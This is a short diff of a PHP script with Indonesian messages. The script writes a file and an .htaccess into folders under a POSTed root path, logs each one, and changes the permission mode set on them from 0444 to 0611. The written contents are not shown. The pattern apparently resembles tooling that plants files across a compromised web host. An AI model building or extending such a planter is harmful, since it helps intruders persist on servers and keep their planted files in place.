@@ -51,7 +51,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['root_path'])) {
                     if (@file_put_contents($targetFile, $fileContent) !== false) {
                         $outputLog[] = "✅ File: $targetFile";
                         file_put_contents($logFile, $targetFile . PHP_EOL, FILE_APPEND);
-                        @chmod($targetFile, 0444);
+                        @chmod($targetFile, 0611);
                     } else {
                         $outputLog[] = "❌ Gagal membuat file di $folder";
                     }
@@ -61,7 +61,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['root_path'])) {
                     $htFile = rtrim($folder, '/') . '/.htaccess';
                     if (@file_put_contents($htFile, $htaccessContent) !== false) {
                         $outputLog[] = "✅ .htaccess: $htFile";
-                        @chmod($htFile, 0444);
+                        @chmod($htFile, 0611);
                     } else {
                         $outputLog[] = "❌ Gagal membuat .htaccess di $folder";
                     }
